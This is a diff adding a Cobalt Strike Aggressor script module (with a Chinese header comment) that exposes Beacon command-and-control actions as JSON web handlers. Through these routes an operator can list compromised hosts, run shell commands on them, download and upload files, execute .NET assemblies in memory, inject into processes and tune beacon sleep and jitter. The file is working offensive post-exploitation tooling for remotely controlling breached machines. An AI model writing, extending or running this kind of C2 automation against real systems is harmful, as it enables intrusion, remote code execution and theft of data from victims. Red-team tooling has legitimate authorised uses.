@@ -1,0 +1,179 @@
+# modules/handlers_beacon.cna
+# Beacon 相关路由处理器
+
+sub handle_list_beacons {
+    local('$exchange @beacons @result %b $json_beacon');
+    $exchange = @_[0];
+    @beacons  = beacons();
+    @result   = @();
+    foreach %b (@beacons) {
+        $json_beacon  = "{";
+        $json_beacon .= "\"id\": \""       . %b["id"]       . "\", ";
+        $json_beacon .= "\"user\": \""     . %b["user"]     . "\", ";
+        $json_beacon .= "\"computer\": \"" . %b["computer"] . "\", ";
+        $json_beacon .= "\"host\": \""     . %b["host"]     . "\", ";
+        $json_beacon .= "\"pid\": "        . %b["pid"]      . ", ";
+        $json_beacon .= "\"os\": \""       . %b["os"]       . "\", ";
+        $json_beacon .= "\"arch\": \""     . %b["arch"]     . "\", ";
+        $json_beacon .= "\"is64\": "       . %b["is64"]     . ", ";
+        $json_beacon .= "\"last\": "       . %b["last"]     . ", ";
+        $json_beacon .= "\"internal\": \"" . %b["internal"] . "\", ";
+        $json_beacon .= "\"note\": \""     . %b["note"]     . "\", ";
+        $json_beacon .= "\"listener\": \"" . %b["listener"] . "\"";
+        $json_beacon .= "}";
+        push(@result, $json_beacon);
+    }
+    send_json_response($exchange, 200, "{\"beacons\": [" . join(", ", @result) . "]}");
+}
+
+sub handle_beacon_shell {
+    local('$exchange $body $bid $cmd');
+    ($exchange, $body) = @_;
+    $bid = parse_json_field($body, "id");
+    $cmd = parse_json_field($body, "command");
+    if ($bid eq "" || $cmd eq "") {
+        send_json_response($exchange, 400, "{\"error\": \"Missing id or command\"}");
+        return;
+    }
+    bshell($bid, $cmd);
+    send_json_response($exchange, 200,
+        "{\"status\": \"queued\", \"bid\": \"" . $bid . "\", \"command\": \"" . $cmd . "\"}");
+}
+
+sub handle_beacon_run {
+    local('$exchange $body $bid $cmd');
+    ($exchange, $body) = @_;
+    $bid = parse_json_field($body, "id");
+    $cmd = parse_json_field($body, "command");
+    if ($bid eq "" || $cmd eq "") {
+        send_json_response($exchange, 400, "{\"error\": \"Missing id or command\"}");
+        return;
+    }
+    brun($bid, $cmd);
+    send_json_response($exchange, 200,
+        "{\"status\": \"queued\", \"bid\": \"" . $bid . "\", \"command\": \"" . $cmd . "\"}");
+}
+
+sub handle_beacon_sleep {
+    local('$exchange $body $bid $sleep $jitter');
+    ($exchange, $body) = @_;
+    $bid    = parse_json_field($body, "id");
+    $sleep  = parse_json_field($body, "sleep");
+    $jitter = parse_json_field($body, "jitter");
+    if ($bid eq "") {
+        send_json_response($exchange, 400, "{\"error\": \"Missing beacon id\"}");
+        return;
+    }
+    if ($sleep eq "")  { $sleep  = 60; }
+    if ($jitter eq "") { $jitter = 20; }
+    bsleep($bid, int($sleep), int($jitter));
+    send_json_response($exchange, 200,
+        "{\"status\": \"queued\", \"bid\": \"" . $bid . "\", \"sleep\": " . $sleep . ", \"jitter\": " . $jitter . "}");
+}
+
+sub handle_beacon_download {
+    local('$exchange $body $bid $remote_path');
+    ($exchange, $body) = @_;
+    $bid         = parse_json_field($body, "id");
+    $remote_path = parse_json_field($body, "path");
+    if ($bid eq "" || $remote_path eq "") {
+        send_json_response($exchange, 400, "{\"error\": \"Missing id or path\"}");
+        return;
+    }
+    bdownload($bid, $remote_path);
+    send_json_response($exchange, 200,
+        "{\"status\": \"queued\", \"bid\": \"" . $bid . "\", \"path\": \"" . $remote_path . "\"}");
+}
+
+sub handle_execute_assembly {
+    local('$exchange $body $bid $assembly_path $args');
+    ($exchange, $body) = @_;
+    $bid           = parse_json_field($body, "id");
+    $assembly_path = parse_json_field($body, "assembly_path");
+    $args          = parse_json_field($body, "args");
+    if ($bid eq "" || $assembly_path eq "") {
+        send_json_response($exchange, 400, "{\"error\": \"Missing id or assembly_path\"}");
+        return;
+    }
+    bexecute_assembly($bid, $assembly_path, $args);
+    send_json_response($exchange, 200,
+        "{\"status\": \"queued\", \"bid\": \"" . $bid . "\", \"assembly\": \"" . $assembly_path . "\"}");
+}
+
+sub handle_beacon_inject {
+    local('$exchange $body $bid $pid $listener $arch');
+    ($exchange, $body) = @_;
+    $bid      = parse_json_field($body, "id");
+    $pid      = parse_json_field($body, "pid");
+    $listener = parse_json_field($body, "listener");
+    $arch     = parse_json_field($body, "arch");
+    if ($bid eq "" || $pid eq "" || $listener eq "") {
+        send_json_response($exchange, 400, "{\"error\": \"Missing id, pid, or listener\"}");
+        return;
+    }
+    if ($arch eq "") { $arch = "x64"; }
+    binject($bid, int($pid), $listener, $arch);
+    send_json_response($exchange, 200,
+        "{\"status\": \"queued\", \"bid\": \"" . $bid . "\", \"target_pid\": " . $pid . "}");
+}
+
+sub handle_beacon_note {
+    local('$exchange $body $bid $note');
+    ($exchange, $body) = @_;
+    $bid  = parse_json_field($body, "id");
+    $note = parse_json_field($body, "note");
+    if ($bid eq "") {
+        send_json_response($exchange, 400, "{\"error\": \"Missing beacon id\"}");
+        return;
+    }
+    bnote($bid, $note);
+    send_json_response($exchange, 200,
+        "{\"status\": \"ok\", \"bid\": \"" . $bid . "\", \"note\": \"" . $note . "\"}");
+}
+
+sub handle_beacon_remove {
+    local('$exchange $body $bid');
+    ($exchange, $body) = @_;
+    $bid = parse_json_field($body, "id");
+    if ($bid eq "") {
+        send_json_response($exchange, 400, "{\"error\": \"Missing beacon id\"}");
+        return;
+    }
+    beacon_remove($bid);
+    send_json_response($exchange, 200,
+        "{\"status\": \"removed\", \"bid\": \"" . $bid . "\"}");
+}
+
+sub handle_beacon_tasks {
+    local('$exchange @result %b %t $json_t');
+    $exchange = @_[0];
+    @result   = @();
+    foreach %b (beacons()) {
+        foreach %t (beacon_log(%b["id"])) {
+            if (%t["type"] eq "task" || %t["type"] eq "input") {
+                $json_t  = "{";
+                $json_t .= "\"bid\": \""  . %b["id"]    . "\", ";
+                $json_t .= "\"time\": "   . %t["when"]  . ", ";
+                $json_t .= "\"type\": \"" . %t["type"]  . "\", ";
+                $json_t .= "\"text\": \"" . str_replace(%t["text"], "\"", "'") . "\"";
+                $json_t .= "}";
+                push(@result, $json_t);
+            }
+        }
+    }
+    send_json_response($exchange, 200, "{\"tasks\": [" . join(", ", @result) . "]}");
+}
+
+sub handle_beacon_upload {
+    local('$exchange $body $bid $local_path');
+    ($exchange, $body) = @_;
+    $bid        = parse_json_field($body, "id");
+    $local_path = parse_json_field($body, "local_path");
+    if ($bid eq "" || $local_path eq "") {
+        send_json_response($exchange, 400, "{\"error\": \"Missing id or local_path\"}");
+        return;
+    }
+    bupload($bid, $local_path);
+    send_json_response($exchange, 200,
+        "{\"status\": \"queued\", \"bid\": \"" . $bid . "\", \"file\": \"" . $local_path . "\"}");
+}
